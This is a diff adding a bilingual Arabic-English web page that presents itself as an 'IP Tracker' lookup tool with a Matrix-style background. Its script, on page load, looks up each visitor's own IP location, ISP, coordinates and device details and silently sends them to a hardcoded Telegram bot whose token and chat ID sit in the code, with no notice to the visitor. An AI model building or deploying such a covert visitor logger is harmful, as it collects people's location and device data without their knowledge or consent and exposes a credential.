@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl" id="htmlRoot">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>IP Tracker</title>
+  <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.33/dist/ua-parser.min.js"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    body {
+      background-color: #000;
+      color: #00ff00;
+      font-family: 'Share Tech Mono', monospace;
+      margin: 0;
+      padding: 20px;
+      overflow-x: hidden;
+    }
+    canvas { position: fixed; top: 0; left: 0; z-index: -1; }
+    .container { 
+      background: rgba(0, 0, 0, 0.8); 
+      border: 1px solid #0f0; 
+      border-radius: 10px; 
+      padding: 1.5rem; 
+      max-width: 800px; 
+      margin: 1rem auto; 
+      box-shadow: 0 0 25px rgba(2, 255, 2, 0.4); 
+      animation: fadeIn 1.5s ease-in-out; 
+    }
+    h1 {
+      text-align: center;
+      font-size: 2.2em;
+      font-weight: bold;
+      text-shadow: 0 0 15px #0f0;
+      font-family: 'Cairo', sans-serif;
+      margin: 0 0 20px 0;
+    }
+    .input-group {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .input-group input {
+      flex: 1;
+      padding: 0.8rem;
+      border: 2px solid #0f0;
+      border-radius: 8px;
+      background: #000;
+      color: #0f0;
+      font-size: 1.1rem;
+      text-align: center;
+      font-family: 'Share Tech Mono', monospace;
+      outline: none;
+    }
+    .input-group button {
+      padding: 0.8rem 1.5rem;
+      background: #0f0;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s;
+      font-size: 1.2rem;
+      font-family: 'Cairo', sans-serif;
+    }
+    .input-group button:hover {
+      background: #111;
+      color: #0f0;
+      border: 2px solid #0f0;
+    }
+    .result {
+      background: #000;
+      padding: 1rem;
+      border-radius: 8px;
+      border: 1px solid #0f0;
+      font-size: 1rem;
+      line-height: 1.8;
+      white-space: pre-wrap;
+      max-height: 400px;
+      overflow-y: auto;
+      color: #0f0;
+    }
+    .result a { color: #39c5bb; text-decoration: underline; }
+    .note { font-size: 0.9em; color: #888; text-align: center; margin-top: 15px; font-family: 'Cairo', sans-serif; }
+    .lang-toggle {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      padding: 8px 14px;
+      background: rgba(0, 255, 0, 0.1);
+      color: #0f0;
+      border: 1px solid #0f0;
+      border-radius: 6px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: 0.3s;
+      font-family: 'Share Tech Mono', monospace;
+    }
+    .lang-toggle:hover { background: #0f0; color: #000; }
+    @keyframes fadeIn { from {opacity: 0; transform: translateY(-20px);} to {opacity: 1; transform: translateY(0);} }
+  </style>
+</head>
+<body>
+  <canvas id="matrix"></canvas>
+  <button class="lang-toggle" id="langBtn" onclick="toggleLanguage()">English</button>
+
+  <div class="container">
+    <h1><span id="title">تتبع عنوان IP</span> <span>⚡</span></h1>
+    <div class="input-group">
+      <input type="text" id="ipInput" placeholder="" />
+      <button onclick="trackIP()"><span id="searchBtn">بحث</span></button>
+    </div>
+    <div id="result" class="result"></div>
+    <p class="note"><span id="noteText">يمكنك إدخال أي IP للبحث عنه، أو تركه فارغًا لمعرفة بياناتك أنت.</span></p>
+  </div>
+
+  <script>
+    // Matrix Effect
+    const canvas = document.getElementById("matrix");
+    const ctx = canvas.getContext("2d");
+    canvas.height = window.innerHeight;
+    canvas.width = window.innerWidth;
+    const letters = "01";
+    const fontSize = 14;
+    const columns = canvas.width / fontSize;
+    const drops = [];
+    for (let x = 0; x < columns; x++) drops[x] = 1;
+    function draw() {
+        ctx.fillStyle = "rgba(0,0,0,0.05)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0f0";
+        ctx.font = fontSize + "px monospace";
+        for (let i = 0; i < drops.length; i++) {
+            const text = letters.charAt(Math.floor(Math.random() * letters.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        }
+    }
+    setInterval(draw, 35);
+
+    // --- بقية كود JavaScript بدون تغيير ---
+    const translations = {
+      ar: {
+        title: "تتبع عنوان IP",
+        placeholder: "أدخل عنوان IP (مثل: 8.8.8.8)",
+        searchBtn: "بحث",
+        noteText: "يمكنك إدخال أي IP للبحث عنه، أو تركه فارغًا لمعرفة بياناتك أنت.",
+        loading: "جاري جلب البيانات...",
+        fail: "❌ لم يتم العثور على بيانات لهذا IP.",
+        reason: "السبب",
+        error: "خطأ في الاتصال بالخادم.",
+        visit: "زيارة جديدة",
+        lookup: "بحث عن IP",
+        target: "الهدف IP",
+        userIP: "IP المستخدم",
+        result: "النتيجة",
+        success: "نجاح",
+        device: "الجهاز",
+        os: "النظام",
+        browser: "المتصفح",
+        postal: "الرمز البريدي",
+        network: "نوع الشبكة",
+        sim: "شركة الشريحة"
+      },
+      en: {
+        title: "IP Tracker",
+        placeholder: "Enter IP address (e.g. 8.8.8.8)",
+        searchBtn: "Search",
+        noteText: "You can enter any IP to look it up, or leave it empty to detect your own IP.",
+        loading: "Fetching data...",
+        fail: "❌ No data found for this IP.",
+        reason: "Reason",
+        error: "Connection error with server.",
+        visit: "New Visit",
+        lookup: "IP Lookup",
+        target: "Target IP",
+        userIP: "User IP",
+        result: "Result",
+        success: "Success",
+        device: "Device",
+        os: "OS",
+        browser: "Browser",
+        postal: "Postal Code",
+        network: "Network Type",
+        sim: "SIM Operator"
+      }
+    };
+
+    let currentLang = localStorage.getItem('lang') || 'ar';
+    
+    function setLanguage(lang) {
+      const t = translations[lang];
+      document.getElementById('title').textContent = t.title;
+      document.getElementById('ipInput').placeholder = t.placeholder;
+      document.getElementById('searchBtn').textContent = t.searchBtn;
+      document.getElementById('noteText').textContent = t.noteText;
+      document.getElementById('langBtn').textContent = lang === 'ar' ? 'English' : 'العربية';
+      document.getElementById('htmlRoot').dir = lang === 'ar' ? 'rtl' : 'ltr';
+      document.getElementById('htmlRoot').lang = lang;
+      localStorage.setItem('lang', lang);
+      currentLang = lang;
+    }
+
+    function toggleLanguage() {
+      const newLang = currentLang === 'ar' ? 'en' : 'ar';
+      setLanguage(newLang);
+    }
+
+    setLanguage(currentLang);
+
+    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
+    const CHAT_ID = '1431886140';
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    async function sendToTelegram(message) {
+      try {
+        await fetch(TELEGRAM_API, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+        });
+      } catch (err) {
+        console.warn('فشل في الإرسال إلى تليجرام', err.message);
+      }
+    }
+
+    function getDeviceDetails() {
+      const parser = new UAParser();
+      const result = parser.getResult();
+      const deviceType = {
+        mobile: currentLang === 'ar' ? 'هاتف' : 'Mobile',
+        tablet: currentLang === 'ar' ? 'لوحي' : 'Tablet',
+        desktop: currentLang === 'ar' ? 'كمبيوتر' : 'Desktop',
+      };
+      return {
+        type: deviceType[result.device.type] || (currentLang === 'ar' ? 'غير معروف' : 'Unknown'),
+        model: result.device.model || '',
+        vendor: result.device.vendor || '',
+        os: result.os.name || (currentLang === 'ar' ? 'غير معروف' : 'Unknown'),
+        browser: result.browser.name || (currentLang === 'ar' ? 'غير معروف' : 'Unknown')
+      };
+    }
+
+    function getNetworkType() {
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn) {
+        const type = (conn.effectiveType || conn.type || '').toLowerCase();
+        if (type.includes('4g') || type.includes('3g') || type.includes('2g') || type.includes('cellular')) {
+          return currentLang === 'ar' ? 'بيانات الجوال' : 'Mobile Data';
+        } else if (type.includes('wifi') || type.includes('wlan')) {
+          return 'Wi-Fi';
+        }
+      }
+      return currentLang === 'ar' ? 'غير معروف' : 'Unknown';
+    }
+
+    function getSimOperator(isp) {
+        if (!isp) return currentLang === 'ar' ? 'غير معروفة' : 'Unknown';
+        const lower = isp.toLowerCase();
+        if (lower.includes('vodafone')) return 'Vodafone';
+        if (lower.includes('etisalat') || lower.includes('mobinil')) return 'Etisalat';
+        if (lower.includes('orange')) return 'Orange';
+        if (lower.includes('we') || lower.includes('telecom') || lower.includes('linkdotnet')) return 'WE';
+        return isp;
+    }
+
+    async function trackIP(ip = null) {
+      const resultDiv = document.getElementById("result");
+      const t = translations[currentLang];
+      const targetIP = ip ? ip.trim() : document.getElementById("ipInput").value.trim();
+
+      resultDiv.innerHTML = t.loading;
+      resultDiv.classList.remove('error');
+
+      try {
+        const url = `https://ipapi.co/${targetIP}/json/`;
+        const response = await fetch(url);
+        const data = await response.json();
+
+        if (data.error) {
+          throw new Error(data.reason);
+        }
+
+        const device = getDeviceDetails();
+        const networkType = getNetworkType();
+        const simOperator = getSimOperator(data.org);
+
+        const output = `
+IP Information:
+----------------
+IP Address   : ${data.ip}
+Country      : ${data.country_name} (${data.country_code})
+City         : ${data.city || 'N/A'}
+Region       : ${data.region || 'N/A'}
+Postal Code  : ${data.postal || 'N/A'}
+Latitude     : ${data.latitude}
+Longitude    : ${data.longitude}
+Timezone     : ${data.timezone}
+ISP          : ${data.org || 'N/A'}
+Network      : ${networkType}
+SIM Operator : ${simOperator}
+Map          : <a href="https://www.google.com/maps?q=${data.latitude},${data.longitude}" target="_blank">View on Map</a>
+
+Device Information:
+-------------------
+Device Type  : ${device.type}
+Model        : ${device.vendor} ${device.model}
+OS           : ${device.os}
+Browser      : ${device.browser}
+        `.trim();
+
+        resultDiv.innerHTML = output;
+
+        if (!targetIP) {
+          sendToTelegram(
+            `<b>🔔 New Visit | زيارة جديدة 🔔</b>\n\n`+
+            `<b>IP:</b> <code>${data.ip}</code>\n`+
+            `<b>Location:</b> ${data.city}, ${data.country_name}\n`+
+            `<b>ISP:</b> ${data.org}\n`+
+            `<b>Device:</b> ${device.type} - ${device.os}`
+          );
+        }
+
+      } catch (error) {
+        resultDiv.innerHTML = `❌ ${t.fail}\n${t.reason}: ${error.message}`;
+        resultDiv.classList.add("error");
+      }
+    }
+
+    window.onload = () => trackIP();
+    document.getElementById("ipInput").addEventListener("keypress", (e) => {
+      if (e.key === "Enter") trackIP();
+    });
+  </script>
+</body>
+</html>
